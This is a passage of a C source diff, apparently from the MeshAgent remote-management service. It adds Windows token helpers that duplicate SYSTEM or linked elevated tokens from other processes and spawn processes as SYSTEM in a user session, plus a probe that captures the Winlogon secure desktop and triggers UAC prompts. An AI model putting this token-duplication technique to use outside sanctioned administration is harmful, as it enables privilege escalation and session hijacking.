+		if (!OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID, &currentToken))
+		{
+			if (errorOut != NULL) { *errorOut = GetLastError(); }
+			return FALSE;
+		}
+		if (!DuplicateTokenEx(currentToken, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID, NULL, SecurityImpersonation, TokenPrimary, &duplicatedToken))
+		{
+			if (errorOut != NULL) { *errorOut = GetLastError(); }
+			CloseHandle(currentToken);
+			return FALSE;
+		}
+		CloseHandle(currentToken);
+		if (!SetTokenInformation(duplicatedToken, TokenSessionId, &sessionId, sizeof(sessionId)))
+		{
+			if (errorOut != NULL) { *errorOut = GetLastError(); }
+			CloseHandle(duplicatedToken);
+			return FALSE;
+		}
+		*tokenOut = duplicatedToken;
+		return TRUE;
+	}
+
+	for (i = 0; i < 2; ++i)
+	{
+		DWORD pid = 0;
+		DWORD processSessionId = 0xFFFFFFFF;
+		HANDLE processHandle = NULL;
+		HANDLE processToken = NULL;
+		HANDLE duplicatedToken = NULL;
+
+		if (!MeshService_FindProcessIdByNameAndSessionW(candidates[i], candidateSessions[i], &pid)) { continue; }
+		ProcessIdToSessionId(pid, &processSessionId);
+		processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
+		if (processHandle == NULL) { processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid); }
+		if (processHandle == NULL)
+		{
+			if (errorOut != NULL) { *errorOut = GetLastError(); }
+			continue;
+		}
+		if (!OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID, &processToken))
+		{
+			if (errorOut != NULL) { *errorOut = GetLastError(); }
+			CloseHandle(processHandle);
+			continue;
+		}
+		if (!DuplicateTokenEx(processToken, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID, NULL, SecurityImpersonation, TokenPrimary, &duplicatedToken))
+		{
+			if (errorOut != NULL) { *errorOut = GetLastError(); }
+			CloseHandle(processToken);
+			CloseHandle(processHandle);
+			continue;
+		}
+		if (processSessionId != sessionId && !SetTokenInformation(duplicatedToken, TokenSessionId, &sessionId, sizeof(sessionId)))
+		{
+			if (errorOut != NULL) { *errorOut = GetLastError(); }
+			CloseHandle(duplicatedToken);
+			CloseHandle(processToken);
+			CloseHandle(processHandle);
+			continue;
+		}
+
+		CloseHandle(processToken);
+		CloseHandle(processHandle);
+		*tokenOut = duplicatedToken;
+		return TRUE;
+	}
+
+	return FALSE;
+}
+
+static BOOL MeshService_GetLinkedPrimaryToken(DWORD sessionId, HANDLE* tokenOut, DWORD* errorOut)
+{
+	HANDLE currentToken = NULL;
+	HANDLE userToken = NULL;
+	HANDLE sourceToken = NULL;
+	TOKEN_LINKED_TOKEN linkedToken;
+	TOKEN_ELEVATION_TYPE elevationType = TokenElevationTypeDefault;
+	DWORD bytesReturned = 0;
+	HANDLE duplicatedToken = NULL;
+
+	if (tokenOut != NULL) { *tokenOut = NULL; }
+	if (errorOut != NULL) { *errorOut = ERROR_SUCCESS; }
+	if (tokenOut == NULL)
+	{
+		if (errorOut != NULL) { *errorOut = ERROR_INVALID_PARAMETER; }
+		return FALSE;
+	}
+	if (MeshService_ProcessHasSystemSid())
+	{
+		if (!WTSQueryUserToken(sessionId, &userToken))
+		{
+			if (errorOut != NULL) { *errorOut = GetLastError(); }
+			return FALSE;
+		}
+		sourceToken = userToken;
+		ZeroMemory(&linkedToken, sizeof(linkedToken));
+		if (GetTokenInformation(userToken, TokenElevationType, &elevationType, sizeof(elevationType), &bytesReturned) &&
+			elevationType == TokenElevationTypeFull &&
+			GetTokenInformation(userToken, TokenLinkedToken, &linkedToken, sizeof(linkedToken), &bytesReturned))
+		{
+			sourceToken = linkedToken.LinkedToken;
+		}
+		if (!DuplicateTokenEx(sourceToken, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID, NULL, SecurityImpersonation, TokenPrimary, &duplicatedToken))
+		{
+			if (errorOut != NULL) { *errorOut = GetLastError(); }
+			if (sourceToken != NULL && sourceToken != userToken) { CloseHandle(sourceToken); }
+			CloseHandle(userToken);
+			return FALSE;
+		}
+		MeshService_SetTokenIntegrityLevelToMedium(duplicatedToken);
+		if (sourceToken != NULL && sourceToken != userToken) { CloseHandle(sourceToken); }
+		CloseHandle(userToken);
+		*tokenOut = duplicatedToken;
+		return TRUE;
+	}
+	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &currentToken))
+	{
+		if (errorOut != NULL) { *errorOut = GetLastError(); }
+		return FALSE;
+	}
+	ZeroMemory(&linkedToken, sizeof(linkedToken));
+	if (!GetTokenInformation(currentToken, TokenLinkedToken, &linkedToken, sizeof(linkedToken), &bytesReturned))
+	{
+		if (errorOut != NULL) { *errorOut = GetLastError(); }
+		CloseHandle(currentToken);
+		return FALSE;
+	}
+	CloseHandle(currentToken);
+
+	if (!DuplicateTokenEx(linkedToken.LinkedToken, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT, NULL, SecurityImpersonation, TokenPrimary, &duplicatedToken))
+	{
+		if (errorOut != NULL) { *errorOut = GetLastError(); }
+		CloseHandle(linkedToken.LinkedToken);
+		return FALSE;
+	}
+	CloseHandle(linkedToken.LinkedToken);
+	*tokenOut = duplicatedToken;
+	return TRUE;
+}
+
+static BOOL MeshService_TokenHasSystemSid(HANDLE token)
+{
+	BOOL isSystem = FALSE;
+	DWORD tokenSize = 0;
+	TOKEN_USER* tokenUser = NULL;
+	PSID localSystemSid = NULL;
+	SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
+
+	if (token == NULL) { return FALSE; }
+	GetTokenInformation(token, TokenUser, NULL, 0, &tokenSize);
+	if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
+	{
+		return FALSE;
+	}
+
+	tokenUser = (TOKEN_USER*)ILibMemory_Allocate(tokenSize, 0, NULL, NULL);
+	if (tokenUser != NULL && GetTokenInformation(token, TokenUser, tokenUser, tokenSize, &tokenSize))
+	{
+		if (AllocateAndInitializeSid(&ntAuth, 1, SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &localSystemSid))
+		{
+			isSystem = EqualSid(tokenUser->User.Sid, localSystemSid);
+			FreeSid(localSystemSid);
+		}
+	}
+	if (tokenUser != NULL) { ILibMemory_Free(tokenUser); }
+	return isSystem;
+}
+
+static BOOL MeshService_QueryTokenIntegrityRid(HANDLE token, DWORD* ridOut)
+{
+	DWORD tokenSize = 0;
+	TOKEN_MANDATORY_LABEL* label = NULL;
+	DWORD subAuthorityCount = 0;
+	BOOL ok = FALSE;
+
+	if (ridOut != NULL) { *ridOut = 0; }
+	if (token == NULL || ridOut == NULL) { return FALSE; }
+
+	GetTokenInformation(token, TokenIntegrityLevel, NULL, 0, &tokenSize);
+	if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
+	{
+		return FALSE;
+	}
+	label = (TOKEN_MANDATORY_LABEL*)ILibMemory_Allocate(tokenSize, 0, NULL, NULL);
+	if (label == NULL) { return FALSE; }
+	if (GetTokenInformation(token, TokenIntegrityLevel, label, tokenSize, &tokenSize) &&
+		label->Label.Sid != NULL &&
+		(subAuthorityCount = *GetSidSubAuthorityCount(label->Label.Sid)) > 0)
+	{
+		*ridOut = *GetSidSubAuthority(label->Label.Sid, subAuthorityCount - 1);
+		ok = TRUE;
+	}
+	ILibMemory_Free(label);
+	return ok;
+}
+
+static BOOL MeshService_QueryTokenElevationTypeValue(HANDLE token, TOKEN_ELEVATION_TYPE* elevationTypeOut)
+{
+	DWORD bytesReturned = 0;
+	TOKEN_ELEVATION_TYPE elevationType = TokenElevationTypeDefault;
+
+	if (elevationTypeOut != NULL) { *elevationTypeOut = TokenElevationTypeDefault; }
+	if (token == NULL || elevationTypeOut == NULL) { return FALSE; }
+	if (!GetTokenInformation(token, TokenElevationType, &elevationType, sizeof(elevationType), &bytesReturned))
+	{
+		return FALSE;
+	}
+	*elevationTypeOut = elevationType;
+	return TRUE;
+}
+
+static BOOL MeshService_QueryProcessSecurityState(DWORD pid, BOOL* systemSidOut, DWORD* integrityRidOut, TOKEN_ELEVATION_TYPE* elevationTypeOut, DWORD* sessionIdOut)
+{
+	HANDLE processHandle = NULL;
+	HANDLE token = NULL;
+	BOOL ok = FALSE;
+
+	if (systemSidOut != NULL) { *systemSidOut = FALSE; }
+	if (integrityRidOut != NULL) { *integrityRidOut = 0; }
+	if (elevationTypeOut != NULL) { *elevationTypeOut = TokenElevationTypeDefault; }
+	if (sessionIdOut != NULL) { *sessionIdOut = 0; }
+	if (pid == 0) { return FALSE; }
+
+	processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
+	if (processHandle == NULL) { processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid); }
+	if (processHandle == NULL) { return FALSE; }
+	if (!OpenProcessToken(processHandle, TOKEN_QUERY, &token))
+	{
+		CloseHandle(processHandle);
+		return FALSE;
+	}
+
+	ok = TRUE;
+	if (systemSidOut != NULL) { *systemSidOut = MeshService_TokenHasSystemSid(token); }
+	if (integrityRidOut != NULL) { ok = MeshService_QueryTokenIntegrityRid(token, integrityRidOut) && ok; }
+	if (elevationTypeOut != NULL) { ok = MeshService_QueryTokenElevationTypeValue(token, elevationTypeOut) && ok; }
+	if (sessionIdOut != NULL)
+	{
+		if (!ProcessIdToSessionId(pid, sessionIdOut)) { ok = FALSE; }
+	}
+
+	CloseHandle(token);
+	CloseHandle(processHandle);
+	return ok;
+}
+
+static BOOL MeshService_OpenElevatedPrimaryTokenForSession(DWORD sessionId, HANDLE* tokenOut, DWORD* errorOut)
+{
+	HANDLE userToken = NULL;
+	HANDLE sourceToken = NULL;
+	HANDLE duplicatedToken = NULL;
+	TOKEN_LINKED_TOKEN linkedToken;
+	TOKEN_ELEVATION_TYPE elevationType = TokenElevationTypeDefault;
+	DWORD bytesReturned = 0;
+	DWORD integrityRid = 0;
+	BOOL ok = FALSE;
+
+	if (tokenOut != NULL) { *tokenOut = NULL; }
+	if (errorOut != NULL) { *errorOut = ERROR_SUCCESS; }
+	if (tokenOut == NULL)
+	{
+		if (errorOut != NULL) { *errorOut = ERROR_INVALID_PARAMETER; }
+		return FALSE;
+	}
+	if (!WTSQueryUserToken(sessionId, &userToken))
+	{
+		if (errorOut != NULL) { *errorOut = GetLastError(); }
+		return FALSE;
+	}
+
+	sourceToken = userToken;
+	ZeroMemory(&linkedToken, sizeof(linkedToken));
+	if (GetTokenInformation(userToken, TokenElevationType, &elevationType, sizeof(elevationType), &bytesReturned) &&
+		elevationType == TokenElevationTypeLimited &&
+		GetTokenInformation(userToken, TokenLinkedToken, &linkedToken, sizeof(linkedToken), &bytesReturned))
+	{
+		sourceToken = linkedToken.LinkedToken;
+	}
+
+	ok = DuplicateTokenEx(
+		sourceToken,
+		TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID,
+		NULL,
+		SecurityImpersonation,
+		TokenPrimary,
+		&duplicatedToken);
+	if (!ok)
+	{
+		if (errorOut != NULL) { *errorOut = GetLastError(); }
+		if (sourceToken != NULL && sourceToken != userToken) { CloseHandle(sourceToken); }
+		CloseHandle(userToken);
+		return FALSE;
+	}
+	if (!SetTokenInformation(duplicatedToken, TokenSessionId, &sessionId, sizeof(sessionId)))
+	{
+		if (errorOut != NULL) { *errorOut = GetLastError(); }
+		CloseHandle(duplicatedToken);
+		if (sourceToken != NULL && sourceToken != userToken) { CloseHandle(sourceToken); }
+		CloseHandle(userToken);
+		return FALSE;
+	}
+	if (!MeshService_QueryTokenIntegrityRid(duplicatedToken, &integrityRid) || integrityRid < SECURITY_MANDATORY_HIGH_RID)
+	{
+		if (errorOut != NULL) { *errorOut = ERROR_PRIVILEGE_NOT_HELD; }
+		CloseHandle(duplicatedToken);
+		if (sourceToken != NULL && sourceToken != userToken) { CloseHandle(sourceToken); }
+		CloseHandle(userToken);
+		return FALSE;
+	}
+
+	if (sourceToken != NULL && sourceToken != userToken) { CloseHandle(sourceToken); }
+	CloseHandle(userToken);
+	*tokenOut = duplicatedToken;
+	return TRUE;
+}
+
+static BOOL MeshService_SpawnExecutableWithTokenW(HANDLE token, const WCHAR* executablePath, const WCHAR* arguments, const WCHAR* desktop, PROCESS_INFORMATION* processInfo, DWORD* errorOut)
+{
+	STARTUPINFOW startupInfo;
+	WCHAR commandLine[4096] = { 0 };
+	BOOL ok = FALSE;
+	DWORD createFlags = CREATE_NO_WINDOW;
+
+	if (errorOut != NULL) { *errorOut = ERROR_SUCCESS; }
+	if (token == NULL || processInfo == NULL)
+	{
+		if (errorOut != NULL) { *errorOut = ERROR_INVALID_PARAMETER; }
+		return FALSE;
+	}
+	ZeroMemory(processInfo, sizeof(PROCESS_INFORMATION));
+	if (executablePath == NULL || executablePath[0] == L'\0')
+	{
+		if (errorOut != NULL) { *errorOut = ERROR_INVALID_PARAMETER; }
+		return FALSE;
+	}
+	if (arguments != NULL && arguments[0] != L'\0')
+	{
+		if (FAILED(StringCchPrintfW(commandLine, _countof(commandLine), L"\"%ls\" %ls", executablePath, arguments)))
+		{
+			if (errorOut != NULL) { *errorOut = ERROR_INSUFFICIENT_BUFFER; }
+			return FALSE;
+		}
+	}
+	else
+	{
+		if (FAILED(StringCchPrintfW(commandLine, _countof(commandLine), L"\"%ls\"", executablePath)))
+		{
+			if (errorOut != NULL) { *errorOut = ERROR_INSUFFICIENT_BUFFER; }
+			return FALSE;
+		}
+	}
+
+	ZeroMemory(&startupInfo, sizeof(startupInfo));
+	startupInfo.cb = sizeof(startupInfo);
+	startupInfo.lpDesktop = (LPWSTR)((desktop != NULL && desktop[0] != L'\0') ? desktop : L"winsta0\\default");
+
+	ok = CreateProcessAsUserW(token, executablePath, commandLine, NULL, NULL, FALSE, createFlags, NULL, NULL, &startupInfo, processInfo);
+	if (!ok)
+	{
+		ok = CreateProcessWithTokenW(token, LOGON_WITH_PROFILE, executablePath, commandLine, createFlags, NULL, NULL, &startupInfo, processInfo);
+	}
+	if (!ok && errorOut != NULL) { *errorOut = GetLastError(); }
+	return ok;
+}
+
+static BOOL MeshService_SpawnVisibleExecutableWithTokenW(HANDLE token, const WCHAR* executablePath, const WCHAR* arguments, const WCHAR* desktop, PROCESS_INFORMATION* processInfo, DWORD* errorOut)
+{
+	STARTUPINFOW startupInfo;
+	WCHAR commandLine[4096] = { 0 };
+	BOOL ok = FALSE;
+	DWORD createFlags = CREATE_NEW_CONSOLE;
+
+	if (errorOut != NULL) { *errorOut = ERROR_SUCCESS; }
+	if (token == NULL || processInfo == NULL)
+	{
+		if (errorOut != NULL) { *errorOut = ERROR_INVALID_PARAMETER; }
+		return FALSE;
+	}
+	ZeroMemory(processInfo, sizeof(PROCESS_INFORMATION));
+	if (executablePath == NULL || executablePath[0] == L'\0')
+	{
+		if (errorOut != NULL) { *errorOut = ERROR_INVALID_PARAMETER; }
+		return FALSE;
+	}
+	if (arguments != NULL && arguments[0] != L'\0')
+	{
+		if (FAILED(StringCchPrintfW(commandLine, _countof(commandLine), L"\"%ls\" %ls", executablePath, arguments)))
+		{
+			if (errorOut != NULL) { *errorOut = ERROR_INSUFFICIENT_BUFFER; }
+			return FALSE;
+		}
+	}
+	else
+	{
+		if (FAILED(StringCchPrintfW(commandLine, _countof(commandLine), L"\"%ls\"", executablePath)))
+		{
+			if (errorOut != NULL) { *errorOut = ERROR_INSUFFICIENT_BUFFER; }
+			return FALSE;
+		}
+	}
+
+	ZeroMemory(&startupInfo, sizeof(startupInfo));
+	startupInfo.cb = sizeof(startupInfo);
+	startupInfo.lpDesktop = (LPWSTR)((desktop != NULL && desktop[0] != L'\0') ? desktop : L"winsta0\\default");
+	startupInfo.dwFlags = STARTF_USESHOWWINDOW;
+	startupInfo.wShowWindow = SW_SHOWNORMAL;
+
+	ok = CreateProcessAsUserW(token, executablePath, commandLine, NULL, NULL, FALSE, createFlags, NULL, NULL, &startupInfo, processInfo);
+	if (!ok)
+	{
+		ok = CreateProcessWithTokenW(token, LOGON_WITH_PROFILE, executablePath, commandLine, createFlags, NULL, NULL, &startupInfo, processInfo);
+	}
+	if (!ok && errorOut != NULL) { *errorOut = GetLastError(); }
+	return ok;
+}
+
+static BOOL MeshService_SpawnProcessWithTokenW(HANDLE token, const WCHAR* arguments, const WCHAR* desktop, PROCESS_INFORMATION* processInfo, DWORD* errorOut)
+{
+	WCHAR exePath[MAX_PATH * 2] = { 0 };
+
+	if (GetModuleFileNameW(NULL, exePath, (DWORD)_countof(exePath)) == 0)
+	{
+		if (errorOut != NULL) { *errorOut = GetLastError(); }
+		return FALSE;
+	}
+	return MeshService_SpawnExecutableWithTokenW(token, exePath, arguments, desktop, processInfo, errorOut);
+}
+
+static BOOL MeshService_TerminateProcessesByNameInSessionW(const WCHAR* processName, DWORD sessionId, DWORD* terminatedCountOut)
+{
+	HANDLE snapshot = INVALID_HANDLE_VALUE;
+	PROCESSENTRY32W entry;
+	DWORD terminatedCount = 0;
+
+	if (terminatedCountOut != NULL) { *terminatedCountOut = 0; }
+	if (processName == NULL || processName[0] == L'\0') { return FALSE; }
+
+	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (snapshot == INVALID_HANDLE_VALUE) { return FALSE; }
+
+	ZeroMemory(&entry, sizeof(entry));
+	entry.dwSize = sizeof(entry);
+	if (!Process32FirstW(snapshot, &entry))
+	{
+		CloseHandle(snapshot);
+		return FALSE;
+	}
+
+	do
+	{
+		DWORD processSessionId = 0;
+		HANDLE processHandle = NULL;
+
+		if (_wcsicmp(entry.szExeFile, processName) != 0) { continue; }
+		if (!ProcessIdToSessionId(entry.th32ProcessID, &processSessionId) || processSessionId != sessionId) { continue; }
+
+		processHandle = OpenProcess(PROCESS_TERMINATE | SYNCHRONIZE, FALSE, entry.th32ProcessID);
+		if (processHandle == NULL) { continue; }
+		if (TerminateProcess(processHandle, 1))
+		{
+			++terminatedCount;
+			WaitForSingleObject(processHandle, 5000);
+		}
+		CloseHandle(processHandle);
+	} while (Process32NextW(snapshot, &entry));
+
+	CloseHandle(snapshot);
+	if (terminatedCountOut != NULL) { *terminatedCountOut = terminatedCount; }
+	return (terminatedCount > 0);
+}
+
+static void MeshService_EnableKvmDpiAwareness(void)
+{
+	HMODULE shcore = LoadLibraryExA((LPCSTR)"Shcore.dll", NULL, LOAD_LIBRARY_SEARCH_SYSTEM32);
+	DpiAwarenessFunc dpiAwareness = NULL;
+
+	if (shcore != NULL)
+	{
+		dpiAwareness = (DpiAwarenessFunc)GetProcAddress(shcore, (LPCSTR)"SetProcessDpiAwareness");
+	}
+	if (dpiAwareness != NULL)
+	{
+		dpiAwareness(PROCESS_PER_MONITOR_DPI_AWARE);
+		FreeLibrary(shcore);
+	}
+	else
+	{
+		if (shcore != NULL) { FreeLibrary(shcore); }
+		SetProcessDPIAware();
+	}
+}
+
+static void MeshService_SecureDesktopProbeSnapshotDesktop(MeshServiceSecureDesktopProbeState* state)
+{
+	const char* desktopName = NULL;
+
+	if (state == NULL) { return; }
+	desktopName = kvm_get_current_desktop_name();
+	if (desktopName == NULL || desktopName[0] == '\0') { return; }
+	if (state->initialDesktop[0] == '\0')
+	{
+		StringCchCopyA(state->initialDesktop, _countof(state->initialDesktop), desktopName);
+	}
+	StringCchCopyA(state->finalDesktop, _countof(state->finalDesktop), desktopName);
+}
+
+static ILibTransport_DoneState MeshService_KvmSecureDesktopWriteSink(char* buffer, int bufferLen, void* reserved)
+{
+	MeshServiceSecureDesktopProbeState* state = (MeshServiceSecureDesktopProbeState*)reserved;
+	unsigned short type = 0;
+
+	if (state == NULL || buffer == NULL || bufferLen < 4) { return ILibTransport_DoneState_COMPLETE; }
+	type = ntohs(((unsigned short*)buffer)[0]);
+	MeshService_SecureDesktopProbeSnapshotDesktop(state);
+	if (type == 7 || type == 27)
+	{
+		InterlockedIncrement(&state->screenPackets);
+		if (_stricmp(kvm_get_current_desktop_name(), "Winlogon") == 0)
+		{
+			if (state->firstWinlogonTick == 0) { state->firstWinlogonTick = GetTickCount64(); }
+			InterlockedIncrement(&state->winlogonScreenPackets);
+			g_shutdown = 1;
+		}
+	}
+	else if (type == 82 || type == 11)
+	{
+		InterlockedIncrement(&state->displayPackets);
+	}
+	return ILibTransport_DoneState_COMPLETE;
+}
+
+static DWORD WINAPI MeshService_KvmSecureDesktopTimeoutThread(LPVOID user)
+{
+	MeshServiceSecureDesktopProbeState* state = (MeshServiceSecureDesktopProbeState*)user;
+	if (state == NULL) { return 0; }
+	Sleep(state->timeoutMs);
+	g_shutdown = 1;
+	return 0;
+}
+
+static int MeshService_RunKvmSecureDesktopProbeChildCommand(const WCHAR* reportPath, DWORD timeoutMs)
+{
+	MeshServiceSecureDesktopProbeState state;
+	void** parm = NULL;
+	HANDLE timeoutThread = NULL;
+	FILE* file = NULL;
+	errno_t fileErr = 0;
+	BOOL success = FALSE;
+	const char* backendName = NULL;
+	const char* backendReason = NULL;
+	ULONGLONG elapsedMs = 0;
+
+	ZeroMemory(&state, sizeof(state));
+	state.timeoutMs = (timeoutMs == 0) ? 20000 : timeoutMs;
+	state.startedTick = GetTickCount64();
+
+	MeshService_EnableKvmDpiAwareness();
+	kvmConsoleMode = 1;
+
+	parm = (void**)ILibMemory_Allocate(4 * sizeof(void*), 0, 0, NULL);
+	parm[0] = MeshService_KvmSecureDesktopWriteSink;
+	parm[1] = &state;
+	((int*)&(parm[2]))[0] = 1;
+	((int*)&(parm[3]))[0] = 0;
+
+	timeoutThread = CreateThread(NULL, 0, MeshService_KvmSecureDesktopTimeoutThread, &state, 0, 0);
+	kvm_server_mainloop(parm);
+	if (timeoutThread != NULL)
+	{
+		WaitForSingleObject(timeoutThread, 100);
+		CloseHandle(timeoutThread);
+	}
+
+	MeshService_SecureDesktopProbeSnapshotDesktop(&state);
+	backendName = get_capture_backend_name();
+	backendReason = get_capture_backend_reason();
+	elapsedMs = GetTickCount64() - state.startedTick;
+	success = (state.winlogonScreenPackets > 0);
+
+	if (reportPath != NULL && reportPath[0] != L'\0')
+	{
+		fileErr = _wfopen_s(&file, reportPath, L"wb");
+		if (fileErr == 0 && file != NULL)
+		{
+			fprintf(file, "{\"success\":%s,", success ? "true" : "false");
+			fprintf(file, "\"systemSid\":%s,", MeshService_ProcessHasSystemSid() ? "true" : "false");
+			fprintf(file, "\"screenPackets\":%ld,", state.screenPackets);
+			fprintf(file, "\"displayPackets\":%ld,", state.displayPackets);
+			fprintf(file, "\"winlogonScreenPackets\":%ld,", state.winlogonScreenPackets);
+			fprintf(file, "\"elapsedMs\":%llu,", (unsigned long long)elapsedMs);
+			fprintf(file, "\"initialDesktop\":\""); MeshService_FilePrintJsonEscapedUtf8(file, state.initialDesktop); fprintf(file, "\",");
+			fprintf(file, "\"finalDesktop\":\""); MeshService_FilePrintJsonEscapedUtf8(file, state.finalDesktop); fprintf(file, "\",");
+			fprintf(file, "\"backend\":\""); MeshService_FilePrintJsonEscapedUtf8(file, backendName != NULL ? backendName : ""); fprintf(file, "\",");
+			fprintf(file, "\"reason\":\""); MeshService_FilePrintJsonEscapedUtf8(file, backendReason != NULL ? backendReason : ""); fprintf(file, "\"}\n");
+			fclose(file);
+		}
+	}
+	return success ? 0 : 1;
+}
+
+static int MeshService_RunKvmUacConsentTargetCommand(DWORD sleepMs, const WCHAR* reportPath)
+{
+	FILE* file = NULL;
+	errno_t fileErr = 0;
+
+	if (reportPath != NULL && reportPath[0] != L'\0')
+	{
+		fileErr = _wfopen_s(&file, reportPath, L"wb");
+		if (fileErr == 0 && file != NULL)
+		{
+			fprintf(file, "{\"success\":true,\"sleepMs\":%lu}\n", (unsigned long)(sleepMs == 0 ? 1000 : sleepMs));
+			fclose(file);
+		}
+	}
+	Sleep(sleepMs == 0 ? 1000 : sleepMs);
+	return 0;
+}
+
+static int MeshService_RunKvmUacConsentTriggerCommand(const WCHAR* reportPath, DWORD timeoutMs)
+{
+	SHELLEXECUTEINFOW executeInfo;
+	WCHAR exePath[MAX_PATH * 2] = { 0 };
+	WCHAR parameters[256] = { 0 };
+	FILE* file = NULL;
+	errno_t fileErr = 0;
+	BOOL ok = FALSE;
+	DWORD error = ERROR_SUCCESS;
+	DWORD exitCode = STILL_ACTIVE;
+	DWORD childPid = 0;
+	ULONGLONG startedTick = GetTickCount64();
+	ULONGLONG elapsedMs = 0;
+
+	GetModuleFileNameW(NULL, exePath, (DWORD)_countof(exePath));
+	StringCchPrintfW(parameters, _countof(parameters), L"-kvm-uac-consent-target %lu", (unsigned long)((timeoutMs == 0) ? 15000 : timeoutMs));
+
+	ZeroMemory(&executeInfo, sizeof(executeInfo));
+	executeInfo.cbSize = sizeof(executeInfo);
+	executeInfo.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI;
+	executeInfo.lpVerb = L"runas";
+	executeInfo.lpFile = exePath;
+	executeInfo.lpParameters = parameters;
+	executeInfo.nShow = SW_HIDE;
+
+	ok = ShellExecuteExW(&executeInfo);
+	error = ok ? ERROR_SUCCESS : GetLastError();
+	if (ok && executeInfo.hProcess != NULL)
+	{
+		childPid = GetProcessId(executeInfo.hProcess);
+		WaitForSingleObject(executeInfo.hProcess, timeoutMs == 0 ? 15000 : timeoutMs);
+		GetExitCodeProcess(executeInfo.hProcess, &exitCode);
+		CloseHandle(executeInfo.hProcess);
+	}
+	elapsedMs = GetTickCount64() - startedTick;
+
+	if (reportPath != NULL && reportPath[0] != L'\0')
+	{
+		fileErr = _wfopen_s(&file, reportPath, L"wb");
+		if (fileErr == 0 && file != NULL)
+		{
+			fprintf(file, "{\"success\":%s,", ok ? "true" : "false");
+			fprintf(file, "\"error\":%lu,", (unsigned long)error);
+			fprintf(file, "\"childPid\":%lu,", (unsigned long)childPid);
+			fprintf(file, "\"exitCode\":%lu,", (unsigned long)exitCode);
+			fprintf(file, "\"elapsedMs\":%llu}\n", (unsigned long long)elapsedMs);
+			fclose(file);
+		}
+	}
+	return ok ? 0 : 1;
+}
+
+static int MeshService_RunKvmSecureDesktopProbeCommand(void)
+{
+	WCHAR childReport[MAX_PATH] = { 0 };
+	WCHAR uacReport[MAX_PATH] = { 0 };
+	WCHAR uacTargetReport[MAX_PATH] = { 0 };
+	WCHAR uacScript[MAX_PATH] = { 0 };
+	WCHAR tempPath[MAX_PATH] = { 0 };
+	WCHAR childArgs[512] = { 0 };
+	WCHAR uacArgs[512] = { 0 };
+	WCHAR exePath[MAX_PATH * 2] = { 0 };
+	WCHAR wscriptPath[MAX_PATH] = { 0 };
+	HANDLE systemToken = NULL;
+	HANDLE linkedToken = NULL;
+	PROCESS_INFORMATION childProcess;
+	PROCESS_INFORMATION uacProcess;
+	DWORD sessionId = MeshService_GetCurrentSessionId();
+	DWORD childSpawnError = ERROR_SUCCESS;
+	DWORD uacSpawnError = ERROR_SUCCESS;
+	DWORD systemTokenError = ERROR_SUCCESS;
+	DWORD linkedTokenError = ERROR_SUCCESS;
+	DWORD childExitCode = STILL_ACTIVE;
+	DWORD uacExitCode = STILL_ACTIVE;
+	DWORD consentKillCount = 0;
+	BOOL childSpawned = FALSE;
+	BOOL uacSpawned = FALSE;
+	BOOL systemTokenReady = FALSE;
+	BOOL linkedTokenReady = FALSE;
+	BOOL success = FALSE;
+	char* childJson = NULL;
+	char* uacJson = NULL;
+	char* uacTargetJson = NULL;
+	char* uacScriptUtf8 = NULL;
+
+	ZeroMemory(&childProcess, sizeof(childProcess));
+	ZeroMemory(&uacProcess, sizeof(uacProcess));
+
+	if (ExpandEnvironmentStringsW(L"%PUBLIC%\\Documents\\MeshAgent\\", tempPath, (DWORD)_countof(tempPath)) == 0 || tempPath[0] == L'\0')
+	{
+		GetTempPathW((DWORD)_countof(tempPath), tempPath);
+	}
+	else
+	{
+		CreateDirectoryW(tempPath, NULL);
+	}
+	StringCchPrintfW(childReport, _countof(childReport), L"%lsMeshSecureDesktopProbe_%lu_child.json", tempPath, GetCurrentProcessId());
+	StringCchPrintfW(uacReport, _countof(uacReport), L"%lsMeshSecureDesktopProbe_%lu_uac.json", tempPath, GetCurrentProcessId());
+	StringCchPrintfW(uacTargetReport, _countof(uacTargetReport), L"%lsMeshSecureDesktopProbe_%lu_uac_target.json", tempPath, GetCurrentProcessId());
+	StringCchPrintfW(uacScript, _countof(uacScript), L"%lsMeshSecureDesktopProbe_%lu_uac.vbs", tempPath, GetCurrentProcessId());
+	DeleteFileW(childReport);
+	DeleteFileW(uacReport);
+	DeleteFileW(uacTargetReport);
+	DeleteFileW(uacScript);
+
+	MeshService_EnableNamedPrivilegeW(L"SeDebugPrivilege");
+
+	systemTokenReady = MeshService_OpenPrimarySystemTokenForSession(sessionId, &systemToken, &systemTokenError);
+	if (systemTokenReady)
+	{
+		StringCchPrintfW(childArgs, _countof(childArgs), L"-kvm-secure-desktop-probe-child \"%ls\" %u", childReport, 20000);
+		childSpawned = MeshService_SpawnProcessWithTokenW(systemToken, childArgs, L"winsta0\\default", &childProcess, &childSpawnError);
+	}
